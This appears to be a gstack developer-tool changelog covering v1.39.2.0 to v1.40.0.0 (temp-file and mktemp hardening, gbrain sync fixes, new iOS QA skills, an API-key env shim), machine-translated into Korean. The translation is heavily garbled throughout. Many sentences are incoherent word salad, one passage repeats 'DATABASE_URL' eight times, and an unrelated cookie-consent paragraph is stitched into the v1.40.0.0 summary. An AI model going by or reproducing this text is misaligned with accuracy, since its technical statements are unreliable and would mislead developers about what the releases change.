| `scripts/build-app.sh` DMG 단계 `mktemp -d` 실패 | `$DMG_TMP` 빈; 다음 줄 `cp -a "$APP_DIR" "$DMG_TMP/"` 파일 시스템 루트로 번들을 복사 | 폭발 방지 감시는 `cp`의 앞에 비 zero를 출구로 갑니다; 가짜 mktemp PATH stub는 감시 불을 주장합니다 |
| `bin/gstack-telemetry-sync`와 `supabase/verify-rls.sh` mktemp가 실패할 때 | Fallback to `/tmp/...-$$` - 예측 가능한 PID 경로는 공격자가 사전 생성 또는 symlink 응답 파일을 하자 | mktemp 실패는/aborts를 청결하게 건너 뛰습니다; static invariants는 어떤 `mktemp \를 금지합니다|\| echo` fallback 모양 |
| `browse/src/security-classifier.ts` `downloadFile` 에 독자 거부 중간 흐름 | FD 유출; 반위 `<dest>.tmp.<pid>`는 다음 재량의 `renameSync`에 의해 승진되기 위하여 살아남았습니다 | 작가는 `'close'` 이벤트를 통해 공개되지 않기 때문에, 게으른 FD 오픈은 정리를 경주 할 수 없습니다. 세 실패 경로는 포함 : 독자 거부, 비 - 2xx 응답, 누락 된 몸 |
| `browse/src/meta-commands.ts` `pdf --from-file` 변형된 페이로드 | `JSON.parse`는 `SyntaxError`를 사용자에게 전달합니다; arrays/null/primitives는 침묵하게 모양 체크를 통과했습니다 | `JSON.parse`; 배열, 수, 문자열, boolean, null을 파일 경로 참조하는 유용한 오류가 포함 |
| `bin/gstack-global-discover.ts` `extractCwdFromJsonl` 세션 헤더 >8KB | 캡을 착륙 중간 라인; `JSON.parse` threw on the truncated tail and the project 사라진에서 `/gstack` discovery | 64KB 읽는 모자; 부분 세그먼트를 떨어뜨리는 것은 너무 떨어질 수 없습니다 너무 이른 완전한 선을 |

### 이 빌더를 위한 뜻

GStack Browser DMG 를 `/tmp` 의 동작에서 `/tmp` 를 실행하면, 빌드는 `/` 로 앱 번들을 대신 청소하지 못한다. `gstack-telemetry-sync` 또는 `verify-rls.sh` 를 공유 호스트에서 실행하면, mktemp 실패는 예측 가능한 PID 경로를 통해 쓰기 대신 실행을 무시한다. 보안 클래스의 모델이 일시적인 중간 흐름을 다운로드하면, 다음의 오류가 발생한다. ONNX 의 다음의 파일이 제거된 경우, 다음의 오류가 발생한다. `/gstack`를 실행하면 긴 Claude Code 세션을 통해 발견한 경우, 프로젝트가 위로 표시됩니다. `/gstack-upgrade`를 실행하여 수정을 선택하십시오. no 마이그레이션이 필요합니다.

### 항목화 된 변경

### 추가
- 이 파에서 모든 감사 버그 배송에 대한 회귀 테스트 : `test/regression-pr1169-build-app-sed.test.ts`, `test/regression-pr1169-mktemp-fallbacks.test.ts`, `test/global-discover.test.ts` (새로운 `extractCwdFromJsonl 64KB cap`는 블록 설명), `browse/test/regression-pr1169-pdf-from-file-invalid-json.test.ts`, `browse/test/security-classifier-download-cleanup.test.ts`. 51 5 파일 전체에 대한 주장.

### 고정
- `scripts/build-app.sh`: Chromium rebrand `s///` 뛰기 전에 `$APP_NAME`에서 `/`, `\`)를 `$APP_NAME`에서 주사하는 교체 메타차 (`&`, `/`, `\`)를 재상시킵니다. @RagavRida에 의해 공헌하십시오.
- `scripts/build-app.sh`: DMG를 위해 `mktemp -d`가 비접촉을 반환하는 경우에, 청소하게 밖으로 헛간을, 그래서 실패는 `/`로 복사하는 `cp -a`를 속일 수 없습니다. @RagavRida에 의해 공헌하는.
- `bin/gstack-telemetry-sync`: `mktemp`가 실패할 때 예측 가능한 `/tmp/gstack-sync-$$` fallback를 떨어뜨립니다; stderr 주의와 달리는 것을 건너뛰고 EXIT를 통해 응답 파일을 행복 경로에 덫을 놓습니다. @RagavRida에 의해 공헌하십시오.
- `supabase/verify-rls.sh`: `mktemp`가 실패할 때 예측 가능한 `/tmp/verify-rls-$$-$TOTAL` fallback를 떨어뜨립니다; 체크에서 비 zero를 돌려줍니다. @RagavRida에 의해 기여했습니다.
- `browse/src/security-classifier.ts`: `downloadFile`는 이제 tmp 파일 연결하기 전에 작가의 `'close'` 사건을 기다립니다. Node의 게으른 FD가 열다 - 나른 `unlinkSync`는 ENOENT를 붙인 원본 정리 경로는, 그 후에 `writer.destroy()`는 비동시적으로 그리고 재 창조했습니다. 새로운 시험 스위트에 의해 붙잡은.
- `browse/src/security-classifier.ts`: `downloadFile`는 try/catch에 있는 읽힌 반복을 포장합니다; 독자 거절, 작가 과실, 또는 비-2xx 응답에 반 씩 섞는 tmp는 붙잡지 않으며 FD는 닫힙니다. @RagavRida에 의해 공헌하는.
- `browse/src/meta-commands.ts`: `parsePdfFromFile`는 `JSON.parse`를 감싸고, 오프딩 파일에 대한 유용한 오류가 있는 `browse/src/meta-commands.ts` (array, number, string, boolean, null)를 대체합니다. @RagavRida에 의해 기여합니다.
- `bin/gstack-global-discover.ts`: `extractCwdFromJsonl`는 64KB (8KB에서)를 읽고 파싱하기 전에 부분 세그먼트를 삭제합니다, 그래서 Claude Code 발견 산출에서 사라지는 긴 우두머리를 가진 회의. @RagavRida에 의해 공헌하는.

### 기여자
- `downloadFile`, `parsePdfFromFile` 및 `extractCwdFromJsonl`는 시험 접근을 위한 그들의 각각 단위에서 지금 수출됩니다. 본은 `bin/gstack-global-discover.ts`에 있는 기존하는 `normalizeRemoteUrl` 수출과 일치합니다.

## [1.40.0.0] - 2026-05-16

## **gbrain sync는 설치 경로, 슬러그 알고리즘, federation 큐 및 `.env.local` footgun을 통해 사용자가 비트를 중지합니다.** ## **8개의 커뮤니티 파일 버그는 중앙화된 spawn이드 표면과 기존의 설치에 도달하는 업그레이드 마이그레이션을 가진 하나의 통합 파로 착륙합니다.**

이 웹 사이트는 귀하가 웹 사이트를 탐색하는 동안 귀하의 경험을 향상시키기 위해 쿠키를 사용합니다. 이 쿠키들 중에서 필요에 따라 분류 된 쿠키는 웹 사이트의 기본적인 기능을 수행하는 데 필수적이므로 브라우저에 저장됩니다. 또한이 웹 사이트의 사용 방식을 분석하고 이해하는 데 도움이되는 제 3 자 쿠키를 사용합니다. 이 쿠키는 귀하의 동의하에 만 브라우저에 저장됩니다. 이러한 쿠키 중 일부를 선택 해제하면 검색 환경에 영향을 미칠 수 있습니다. Slugs는 중보 (`skill` → `kill`)를 truncating 중지합니다. `DATABASE_URL` no는 호스트 프로젝트의 `.env.local`에서 gbrain's auth로, 부모 `gstack-gbrain-sync`와 `gstack-memory-ingest` 할머니의 누출을 더 긴 누출합니다. 뇌-allowlist는 마침내 `/plan-eng-review` 테스트 계획 `/office-hours` 디자인 docs from v1.38/>를 통해 실행됩니다. Windows MSYS/MINGW는 bun postinstall에서 충돌을 중지하고, sync time.에 비틀기 전에 기본 아세트산을 끄는 flags probe를 설치합니다.

### 중요 한 숫자

출처: `bun test test/gstack-gbrain-sync.test.ts test/build-gbrain-env.test.ts test/gbrain-exec-invariant.test.ts test/gbrain-source-gitignore.test.ts test/artifacts-init-migration.test.ts test/gstack-memory-ingest.test.ts` — 100개 이상의 단위 테스트, 모든 녹색.

| Surface | 의 전 | 후지후 |
|---|---|---|
| `/sync-gbrain` 내부 Next.js / Prisma / Rails 프로젝트 `.env.local` | 코드 단계는 "source 등록 실패 : gbrain not configuration"; 메모리 스테이지는 "password authentication failed for user 'postgres"; 단지 뇌 동기화 git push 생존 | 모든 세 단계가 실행됩니다. 부모 프로세스 AND 실행하는 bun grandchild `gbrain import` 모두는 gbrain의 자신의 구성에서 가져온 DATABASE_URL를 참조하십시오 |
| 동일한 홈 디디렉션을 가진 두 기계 (chezmoi, ansible) 공유 두뇌 동기화 | 동일한 소스 ID 콜드; `local_path`에 마지막 라이터 윈; 잃어버린의 쿼리 반환 암호화 "git 저장소" 오류 | Distinct 소스 ids (`sha1("${hostname}::${path}")`). gbrain가 `sources rename`를 지원할 때 gbrain가 `sources rename`를 지원하거나, sync verifies (no data-loss window)를 sync 후에 path-only-hash 모양을 가진 사용자를 기존하는 것은 |
| Conductor sibling worktrees of the same repo | `.gbrain-source` worktree A에서 최선을 다하고, clobbers worktree B의 핀 다음 `git pull`, 잘못된 소스에 semantic 검색 경로 | `.gbrain-source` 이제는 모든 성공적인 동기화에 소비자 repo의 `.gitignore`의 땅에 있습니다. Idempotent 재 실행 |
| `gstack-code-drummerms-av-sow-wiz-skill-270c0001` (긴 repo 이름 강제적인 truncation) | `gstack-code-kill-270c0001-c32152` (단어는 `skill` → `kill`에서 자르십시오) | `gstack-code-270c0001-050d83` (하이픈 경계에 구멍 군 커트; org prefix 힘 과잉 때 `repo-only-hostpathhash` 재기) |
| `https://github.com/foo/bar.git` HTTPS 리모트 (#1357) | 슬루그는 기간을 통해 수행 할 수, gbrain의 1-32 alnum-hyphen validator 실패 | 보장되는 자유로운 진창; `test/gstack-gbrain-sync.test.ts`에 핀으로 꼿는 표적으로 한 회귀 시험 |
| 연맹 동기화 allowlist (v1.38.1.0에서 사용자 업그레이드를 연장) | `projects/*/*-eng-review-test-plan-*.md`는 v1.38.1.0의 행마자; `/plan-eng-review` 시험은 침묵하게 떨어뜨립니다 | v1.40.0.0 마이그레이션 해소 패치 `.brain-allowlist`, `.brain-privacy-map.json`, `.gitattributes` v1.38.1.0 상태의 상단에 |
| `bun install` Windows MSYS / MINGW / Git Bash에 gbrain를 위해 | 비제로 출구로 스크립트 낙태를 설치하십시오. `gstack-gbrain-install`는 전체 흐름을 실패합니다. | `--ignore-scripts` 에 Windows 포탄; 포스트 설치 probe의 `gbrain sources --help` 깃발 그들에 sync 시간에 가닥 전에 누락한 본래 artifacts |
| Spawning `gbrain` from gstack | 17+ 직접 `spawnSync("gbrain"`/`spawn("gbrain"`/`execFileSync("gbrain"` codebase의 맞은편에 위치, 각 1개의 미사일 ENv-threading 위험 | 두 개의 핫 경로 파일 (`bin/gstack-gbrain-sync.ts`, `bin/gstack-memory-ingest.ts`) 경로 `lib/gbrain-exec.ts`를 통해 모든 gbrain spawn를 경로. 정적 소스 invariant 테스트는 직접 전화 사이트에 빌드가 실패 |

### 이 빌더를 위한 뜻

프레임 워크 프로젝트 (Next.js, Prisma, Rails, 등) 내부의 AND 메모리 스테이지가 이제 작동되는 코드 no, `~/.zshrc`, 먼저 `DATABASE_URL`, `DATABASE_URL`, `DATABASE_URL`, `DATABASE_URL`, `DATABASE_URL`, `DATABASE_URL`, `DATABASE_URL`, `DATABASE_URL` 등. 여러 기계 (chezmoi-managed dotfiles, ansible-provisioned VMs)를 동기화하면, 소스 ids가 서로 다른 페이지의 반복을 유지하거나, 다시 실행할 수 있습니다. 긴 repo 이름을 발송하면 슬러그가 깨끗하게 읽습니다. `/gstack-upgrade`를 실행하여 뇌로울리스트 마이그레이션을 선택하십시오. 다른 모든 것은 다음 동기화에 자동적입니다.

### 항목화 된 변경

#### 추가

- **`/ios-qa`** (770-line SKILL.md.tmpl) - 웜 - 스타트 세션 캐시, 주문형 daemon spawn, 스태크스, 데모 + 레코딩 모드, 풀 실패 모드 + 복구 매트릭스.
- **`/ios-fix`** - `/state/snapshot` BEFORE 편집 소스를 재현한 자율 버그 수정자, + redeploys + verifies. 스냅 샷은 회귀 테스트 정착물이된다.
- **`/ios-design-review`** — 10dimension Apple HIG 실제 기기에 감사. 0-10는 "what make it a 10" framing, 거울 `/plan-design-review` 브라우저에 대 한 루비.
- **`/ios-clean`** - `DebugBridge` SPM + `#if DEBUG` 배선을 줄무늬가 있는 편익 래퍼. Explicitly NOT 안전 크리티컬 경로 — 구조상 방출 구조 감시는 `Package.swift`입니다.
- **`/ios-sync`** - 최신 업스트림 gstack 템플릿에 대한 재생 액세스. 업그레이드 후 실행 gstack 또는 새로운 `@Observable` 클래스를 추가.
- `ios-qa/templates/StateServer.swift.template` - 이중 압회복 결합 (`::1` + `127.0.0.1`), 시동 token 교체, 뮤토 전용 슬라이딩 윈도우, snapshot/restore 와 스코마 봉투 (`_schema_version` + `_app_build_id` + `_accessor_hash`), 단일 대역 구조 할당을 통해 검증된 그 후에 승인되는 원자성, 1MB 몸.
- `ios-qa/templates/DebugOverlay.swift.template` - 애니메이션 브랜드 색의 경계, 에이전트 attribution 칩 (`X-Agent-Identity` 헤더, 디스플레이 전용, 결코 auth), 스크린 캐스트에 대한 옵션 녹음 모드 워터 마크에 대해 신뢰할 수 없습니다.
- `ios-qa/templates/Package.swift.template` - DebugBridge 대상이 `.when(configuration: .debug)`를 문질러. SwiftPM은 릴리스 설정에 대한 링크를 거부한다.
- `ios-qa/daemon/` — Mac-side bun/TS daemon. 단일 인장 flock + 읽음 프로토콜, 실패 닫히는 tailscaled LocalAPI probe, 듀얼 트랙 `/auth/mint` (수당되는 신원, 소유자를 위해 각자 서비스 CLI), 스넷 리커터에 기능 층 allowlist, 해시 ID가 기록, 모든 정통적인 mutatingnet requested 감사.
- `ios-qa/scripts/gen-accessors-tool/` — 생산 코젠을 위한 신속한 합성문을 사용하여 SwiftPM 툴 플러그인.
- `ios-qa/scripts/gen-accessors.ts` — TS 빠른 첫번째 런 및 CI를 위한 fallback. 동일한 합성 캐시 열쇠 (`sha256(source || swift_version || tool_git_rev || platform_triple)`) — codex는 근원 유일한 해시 놓는 발전기 논리 변화를 떨어뜨렸습니다.
- `ios-qa/docs/tailscale-acl-example.md` — tailscaled ACL 설정, 소유자 민트 흐름, 기능 계층, 감사 로그 구조, 속도 제한 및 token 일생을 다루는 실행 가능한 예.
- `test/skill-e2e-ios.test.ts` — 8개의 엔드 투 엔드 시나리오 덮음 코겐 + daemon + stub StateServer + Tailscale gating + 기능 계층.
- 67 daemon 단위/integration는 `session-tokens`, `allowlist`, `auth-mint`, `single-instance`, `tailscale-localapi`, `audit`, `proxy-classify`, `daemon-integration`를 통하여 시험합니다.
- 20의 코겐 테스트 `ios-qa/scripts/gen-accessors.test.ts` 파스, 캐시 키 구성, 캐시 hit/miss, 30d prune, 그리고 3 포크 regex-failure-mode fixtures.

#### 변경

- `test/helpers/touchfiles.ts` - 등록된 `ios-qa-e2e` 접촉파일 (게이트 층, 불일 때 어떤 `ios-*/` dir 변화) 그래서 디퓨트 기반 선택은 iOS 작업을 선택합니다.
- `AGENTS.md`, `docs/skills.md` — 다섯 가지 새로운 기술을 다루는 "iOS QA"섹션을 추가했습니다.

### Hardened (codex-flagged 에 the plan-review 외부 음성 패스)

- iOS StateServer는 루프백 전용 ALWAYS입니다. 테넷 진입은 Mac daemon의 책임이 독점적으로되어 있으며, iPhone에는 테일 스케일 식별을 검증하는 no 방법이 있습니다. 따라서 ID 검증 MUST는 Mac-side입니다. 이 계획은 iOS 앱 바인딩 스넷이 직접 가지고 있기 때문에 이전의 피임을 붙잡고 제거했습니다.
- Boot token는 daemon의 ~5s 안에 자전합니다 그래서 과거에 `os_log`를 긁는 것은 죽은 압흔을 보입니다. 포크는 부팅 token에서 `os_log`에 한 번 썼고 daemon의 일생을 위해 그것을 사용했습니다 — 튼튼한 조직에 로그인 냄새.
- `/auth/mint` 신뢰 모델은 두 가지 다른 메커니즘으로 나뉩니다. 자체 서비스 (위탁자는 allowlist) 및 소유자 알갱이로 만들어진 (CLI Mac에서 allowlist 파일). 셀프 서비스 NEVER 자동 허용 목록. 포크는 두 경로 모두 조화.
- Snapshot envelope는 `_accessor_hash`를 포함하므로 snapshot 이전 앱 빌드에 캡처 된 것은 409 schema_mismatch 대신 침묵적으로 손상 상태로 크게 거부됩니다.
- `GET /state/snapshot`는 ONLY 필드가 `@Snapshotable`를 표시했습니다. 기본적으로-leak 대신 기본값은 토큰, PII, auth 상태를 명시적으로 선택하지 않는 한 에이전트 가시성을 유지합니다.
- 테넷 리스너는 tailscaled LocalAPI가 허용되지 않는 경우 닫히지 않습니다. Daemon은 반시작보다는 모두 tailnet 리스너를 열지 않습니다.
- `X-Agent-Identity` 헤더는 디스플레이 전용입니다. auth 또는 디스플레이 칩을 넘어 감사를 읽지 마십시오. token는 기능 계층을 결정하는 것입니다.

#### 기여자

- 새로운 SwiftPM 도구 의존성 : `swift-syntax`. 첫 번째 실행은 컨벤스 트리 (냉각 기계에 2-5 분, ~50ms 이후 내용 해시 캐시를 통해)를 구축합니다. 문서는 `/ios-qa`에서 "첫 번째 설정" UX 그래서 사용자가 무슨 일이 일어나는지 알고 있습니다.
- TS fallback in `ios-qa/scripts/gen-accessors.ts`는 테스트 + CI 운동이 무엇인지 나타냅니다. 생산 사용자는 사용할 때 스위프트 도구를 얻습니다. CI는 빌드하기 위해 신속한 합성을 위해 5 분 동안 기다릴 수 없습니다.
- daemon HTTP egress는 `JSON.stringify(payload, sanitizeReplacer)`를 통해 안토로픽 API에 도달하기 전에 지구에 surrogates를 통해서 갑니다 - 거울 `browse/src/sanitize-replacer.ts`. 터널 소음 로깅 거울 `browse/src/tunnel-denial-log.ts`. No 새로운 auth/logging 원시.

@sinacodedit에 의해 기여 (time-attack/gstack에서 위조).
- `lib/gbrain-exec.ts` (새로운, ~175 라인) - gbrain CLI invocation의 단원. `buildGbrainEnv`씨 DATABASE_URL `${GBRAIN_HOME:-$HOME/.gbrain}/config.json`, `GSTACK_RESPECT_ENV_DATABASE_URL=1` 프로젝트의 로컬 DB에서 뇌가 의도적으로 생활하는 희소한 경우를 위해 선택 밖으로 `spawnGbrain`/ `execGbrainJson`/`execGbrainText`/ `spawnGbrainAsync` 래퍼는 항상 씨앗이 담긴 envc (no)를 반환합니다.
- `bin/gstack-gbrain-sync.ts`: `derivePathOnlyHashLegacyId`, `gbrainSupportsSourcesRename` (exact-command 특징 체크), `sourceLocalPath`, `planHostnameFoldMigration`, `removeOrphanedSource`. 호스트명 접히는 이동: 오래된 모양을 검출하십시오 → probe 경로 drift → 장소 (지원되는 경우에)에 있는 이름 → 가을은 등록 새로운 + sync-OK + 제거 오래된 것.
- `gstack-upgrade/migrations/v1.40.0.0.sh` - `.brain-allowlist`, `.brain-privacy-map.json`, `.gitattributes`를 위한 idempotent jq 근거한 이동은 `projects/*/*-eng-review-test-plan-*.md`를 추가하기 위하여 이동합니다. 표적을 두는 배치; 결코 `git commit + push`.
- `test/build-gbrain-env.test.ts` (10개의 시험) - 커버 seed/override/escape-hatch/missing/unparseable/no-database_url/GBRAIN_HOME/object-identity/preservation/idempotent-when-matches.
- `test/gbrain-exec-invariant.test.ts` (2개의 시험) — `bin/gstack-gbrain-sync.ts` 또는 `bin/gstack-memory-ingest.ts`가 돕기 밖에 직접 gbrain spawn를 추가하는 경우에 구조가 실패하는 정체되는 자원 체크.
- `test/gbrain-source-gitignore.test.ts` (6개의 시험) — 덮는 창조/부드/idempotent/whitespace/read-only 체크 아웃.
- `test/gstack-gbrain-sync.test.ts` — 마이그레이션 경로, 경로, 하이픈 경계선, HTTPS 슬러그 기간 회귀 (#1357) 및 중앙 집중식 돕기 배관을위한 15 + 새로운 테스트.
- `test/artifacts-init-migration.test.ts` — v1.40.0.0 migration for the top of install v1.38.1.0 state.

#### 변경

- `bin/gstack-gbrain-sync.ts` - `deriveCodeSourceId`는 AND를 `repo-only-hostpathhash`로 옮긴 truncation를 풀 때 `repo-only-hostpathhash`로 옮깁니다. `constrainSourceId`는 hyphen 경계 (no 더 미드-word `skill` → `kill`)에 삭감합니다. `runCodeImport`는 v1.x 유산정정을 통해 hostname-fold migration를 실행하고, 각 문헌을 통해서 종결된 자료 또는 AFTER를 통해서 문헌을 실을 꿰는 AFTER를 갖습니다. `ensureGbrainSourceGitignored`는 `.gbrain-source`를 소비자 repo의 `.gitignore`에 성공한 부착 후에 부를 것입니다. `if (import.meta.main)` 감시는 이렇게 파일을 단위 시험을 위해 수입할 수 있습니다.
- `bin/gstack-memory-ingest.ts` - 경로를 `gbrain --help` probe 및 `gbrain import` 도움자를 통해서 스패드를 스트리밍합니다. bun grandchild는 이제 `gstack-gbrain-sync`에서 시드를 붙인 env를 상속합니다; 독립 사물품을 위한 기억에 남는 각자 안쪽에 방어적인 시드를 내립니다.
- `bin/gstack-artifacts-init` - `.brain-allowlist`, `.brain-privacy-map.json` (클래스 `artifact`), `.gitattributes` (`merge=union`)에 `projects/*/*-eng-review-test-plan-*.md`를 추가합니다.
- `bin/gstack-gbrain-install` — Windows MSYS/MINGW/Cygwin 포탄은 `bun install --ignore-scripts`를 얻습니다. probe의 포스트 설치 `gbrain sources --help`는 명확한 Windows 특정한 구제 메시지를 가진 누락한 기본 아세트산을 놓습니다.
- `lib/gbrain-sources.ts` — `gbrain sources list --json` 타임아웃은 10s → 30s를 느리게 합니다 Supabase 라운드 트립.
- `lib/gbrain-local-status.ts` — `gbrain --version`와 `gbrain sources list --json` 조사 사용 `spawnSync` 직접 (no `command -v` 쉘링).

#### 고정

- Hostname-fold 마이그레이션 데이터 손실 창 (codex 검토 #2) : 이전 "register new, remove old" sequence could 와이퍼 페이지가 새 리소스 동기화가 중간 기쁨을 실패하면. 이제 : 새로운 → 동기화 출구 0 → page_count > 0 → 만 THEN 제거.
- 호스트명 배 경로 배 (codex review #3): 이전 소스의 `local_path`가 현재 repo 루트 (사용자가 repo를 이동, 또는 두 개의 기계가 해시 슬롯을 공유)에서 다른 경우, 이동은 장님으로 renaming/removing 대신 명확한 경고로 건너 뛰고 있습니다.
- `.gbrain-source` per-worktree 핀은 commit (#1384)에 끊기: 4개의 기여자는 이 버그를 위해 자주적으로 제출한 고침을 제출했습니다. PR #1521의 수출 객관 모양은 선택되었습니다; PR #1501 및 PR #1464는 supersed로 닫힙니다.
- 크로스 머신 소스 ID 충돌 두 호스트가 경로 레이아웃을 공유 할 때 (#1414).
- 긴 repo 이름은 32-char 캡을 강제 할 때 중간 단어 진거.
- HTTPS-with-`.git` 원격 생산 기간-레이덴 소스 ids (#1357) - 명시된 회귀 테스트로 닫힙니다.
- 기존의 설치에 대한 연맹 큐 드롭핑 `/plan-eng-review` 테스트 계획 (#1452 따르-on).
- gbrain CLI probe Windows 포탄에 실패 `command -v`는 진짜 이진 (#1386 - 부분; Windows 가늠자에 ingest는 분리된 일 남아 있습니다).
- `bun install` Windows MSYS/MINGW 쉘을 gbrain 설치 중 (#1271 턴온)에 보정.

### NOT 이 파 (deferred; 다음 gbrain 파를 위한 나릅니다)에 의해 고쳐지는

- #1346 - `gstack-memory-ingest`는 subcommand를 이름을 바꾸는 gbrain ≥0.18에 `put_page` 호출 `lib/gbrain-exec.ts`를 통해서 probe를 경로를 옮기고 NOT는 `put_page` 외침 모양을 바꾸는 것을 `put_page`를 바꾸습니다. gbrain ≥0.18에 사용자는 “unknown subcommand: put_page”를 가진 기억 ingest 틈을 아직도 볼 수 있습니다 — 분리되는 API 접합기는 그 고침을 소유합니다.
- #1435 - PgBouncer 트랜잭션 모드 풀러는 `/sync-gbrain` 기능 체크를 끊습니다. v1.40.0.0의 타임아웃 범프 (10s → 30s)는 부분적인 완화, 수정이 아닙니다. 풀러 모드 탐지가 필요합니다.
- #1301 — `/setup-gbrain` 포트 6543 (전환 풀러)를 선택하지만 새로운 Supabase 프로젝트는 5432 (보조 풀러) 만 들립니다. Provisioning-logic 변화.
- #1348 - `gstack-brain-init` 기본값은 SSH 리모트에, HTTPS-configured `gh`를 위해 실패합니다. Init-logic 변화.

#### 기여자

- `bin/gstack-gbrain-sync.ts` 또는 `bin/gstack-memory-ingest.ts` MUST에서 새 GBrain 천막은 `spawnGbrain`/ `execGbrainJson`/ `execGbrainText`/ `spawnGbrainAsync`를 통해서 `lib/gbrain-exec.ts`를 통해서 갑니다. invariant 시험 `test/gbrain-exec-invariant.test.ts`는 직접적인 외침 위치에 건축 실패합니다. 이것은 DATABASE_URL를 침묵하게 회귀하는 것에 대하여 이 감시는 미래 기여자가 실을 꿰기 없이 빨리 `spawnSync("gbrain", ...)`를 추가할 때.
- `GSTACK_RESPECT_ENV_DATABASE_URL=1`는 프로젝트의 로컬 DB (예: 개발자는 동일한 포스트글레에 Next.js 앱 사용)에 지적되는 개인 두뇌를 실행하는 프로젝트의 로컬 DB (예: )에 있는 뇌가 지적한 때 문서화된 탈출 해치입니다. default는 gbrain의 구성에서, 콜러의 `.env.local`를 override합니다.
- `bin/gstack-gbrain-sync.ts` 자체의 호스트명 배는 별도의 `gstack-upgrade/migrations/v1.40.0.0.sh` 단계로 아닙니다. 트리거는 "이전 주자 청소"가 아니라 "첫 번째 동기화"입니다. 그것은 idempotent - 반복 인발은 레거시 ID가 실행중인 첫 번째 실행 또는 경로 drift 건너 건너 건너 뛰기에서 renamed/removed를 얻는 것은 아니 ops이기 때문에 아무 문제도 없습니다.
- The wave is credited per commit: 0xDevNinja (hostname fold #1468), drummerms (hyphen-boundary cut #1481), Jayesh Betala (probe CLI #1485), Jason Shultz (DATABASE_URL seeding #1508 + timeout #1507), genisis0x (consumer gitignore #1521, allowlist eng-review pattern #1465, Windows postinstall #1487). NikhileshNanduri (#1501) and realcarsonterry (#1464) submitted independent fixes for the gitignore bug — credited in conversation but not in commits (one canonical implementation landed). Thank you.

## [1.39.2.0] - 2026-05-15

## **콘덕터 작업 공간 와이어 `GSTACK_*` 키는 gbrain embedding 및 유료 evals로 똑바로.** ## **No 각 유료 실행 전에 쉘에서 더 많은 sourcing 키.**

모든 작업 공간의 프로세스 env에서 `ANTHROPIC_API_KEY`와 `OPENAI_API_KEY`를 명시적으로 스트립으로 합니다. `.env` 복사 및 `~/.zshrc` 수출은 파이프라인 또는 `@anthropic-ai/claude-agent-sdk`를 포함하지 않는 gbrain의 embedding에 도달하지 않습니다. 수정 경로는 `GSTACK_ANTHROPIC_API_KEY` / `GSTACK_OPENAI_API_KEY` - 도체를 통해 전달합니다. 새로운 `lib/conductor-env-shim.ts`는 gstack 측에 반복을 닫습니다. 그것은 접목 형형을 비우는 경우 비 빈번하게 할 수 있습니다. 4 TS 항목 포인트는 사이드 효과로 shim를 가져옵니다 (`gstack-gbrain-sync.ts`, `gstack-model-benchmark`, `preflight-agent-sdk.ts`, `e2e-helpers.ts`). `README.md`, `USING_GBRAIN_WITH_GSTACK.md`, `CONTRIBUTING.md`는 패턴을 문서화하고, 새로운 항목에 대한 수입을 추가하기위한 체크리스트를 표시합니다.

### 중요 한 숫자

출처: 커밋하기 전에 작업 트리 검증. 신선한 지휘자 작업 공간의 세 가지 관찰 가능한 시나리오는 env의 `GSTACK_OPENAI_API_KEY`과 `GSTACK_ANTHROPIC_API_KEY`를 사용합니다.

| Surface | 의 전 | 후지후 |
|---|---|---|
| `/sync-gbrain` embeddings | 50+ 라인의 `[gbrain] embedding failed for code file ...: OpenAI embedding requires OPENAI_API_KEY`; 페이지는 구조상으로 색인을 붙였습니다 그러나 BM25에 semantic 수색 degrades | 3294 펑크 임베디드; `gbrain search "browser security canary token"` 0.95 스코어에서 순위 코드 지구를 반환 |
| `bun run test:evals` | `ANTHROPIC_API_KEY not set, judge requires Anthropic access` 에서 `test/helpers/benchmark-judge.ts:15` 어떤 시험 실행하기 전에 | Shim은 모듈 가져 오기에서 촉진합니다. 유료 evals은 일반적으로 진행합니다. |
| 새로운 유료API 입력 지점 추가 | 수동 env 매핑 모든 invocation, 또는 모든 새로운 항목 포인트는 내부 지휘자에서 깨진 | 파일 상단의 `import "../lib/conductor-env-shim";` |

### 이 지휘자 사용자를 위한 무슨 뜻

gstack 내부 지휘자를 실행하면 `/sync-gbrain` embeddings, 유료 evals 및 에이전트 SDK 그냥 당신의 포탄에서 sourcing 키 없이 작동. shim는 15의 선, 부작용 전용이고, 수입품은 소비자 당 1개의 선입니다. 새로운 "Conductor + GSTACK_* env vars" 단면도에 `USING_GBRAIN_WITH_GSTACK.md` 및 갱신한 "Conductor workspaces" 구획이 이렇게 거기에서 그것 겹쳐 쌓이는 것을 가지고 있습니다.

### 항목화 된 변경

#### 추가

- `lib/conductor-env-shim.ts` (새로운, 15의 선) - 수로 이름을 빈 때 `FOO_API_KEY`에 `GSTACK_FOO_API_KEY`를 승진시키는 부작용 IIFE. 현재는 `ANTHROPIC_API_KEY`와 `OPENAI_API_KEY`를 포함합니다.
- `USING_GBRAIN_WITH_GSTACK.md` "설정 후 얻을 수 있는 방법" 섹션 — 세만 코드 검색 + 콘크리트 기능으로 프레임 된 교차 세션 메모리.
- `USING_GBRAIN_WITH_GSTACK.md` 경로 4 (레모드 gbrain MCP/플래스 엔진) 단면도 - 뇌-via-remote-MCP + 코드via-local-PGLite, 이 길을 선택할 때 2개의 엔진을 포함합니다.
- `USING_GBRAIN_WITH_GSTACK.md` `/sync-gbrain` 워크플로우 섹션 - 3 단계 (코드, 메모리, 두뇌 동기화), 로컬 엔진 건강, 워터 마크 + `--skip-failed` 기계, CLAUDE.md 지도 블록을 지배하는 기능 검사에 대한 사전 방전 조명.
- `USING_GBRAIN_WITH_GSTACK.md` "Conductor + GSTACK_* env vars" 섹션은 접두사 패턴을 설명하며, shim를 가져 오는 4 개의 항목 포인트를 나열합니다. `CONTRIBUTING.md`.
- `USING_GBRAIN_WITH_GSTACK.md` 문제 해결 항목: "`/sync-gbrain` 보고서 OK 하지만 `gbrain search` 반환 아무것도 semantic" (결로 실패) 및 "`gbrain sync` 차단 commit 해시, `FILE_TOO_LARGE`" (5 MB 하드 한계, `--skip-failed`를 통해 수정.

#### 변경

- `bin/gstack-gbrain-sync.ts`, `bin/gstack-model-benchmark`, `scripts/preflight-agent-sdk.ts`, `test/helpers/e2e-helpers.ts` - 각의 정상에 `import "../lib/conductor-env-shim";` 추가했습니다. 각 1개의 선, 측 효력 전용.
- `USING_GBRAIN_WITH_GSTACK.md` "three paths" → "four paths" 헤더는 이제 4 경로 (remote MCP)가 일류 선택으로 문서화됩니다.
- `USING_GBRAIN_WITH_GSTACK.md` 환경변수 테이블 - `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, `GSTACK_OPENAI_API_KEY`, `GSTACK_ANTHROPIC_API_KEY` 를 위한 줄을 추가하고, 각 것을 읽는 것을 덮는 GSTACK_-prefix 가을 뒤.
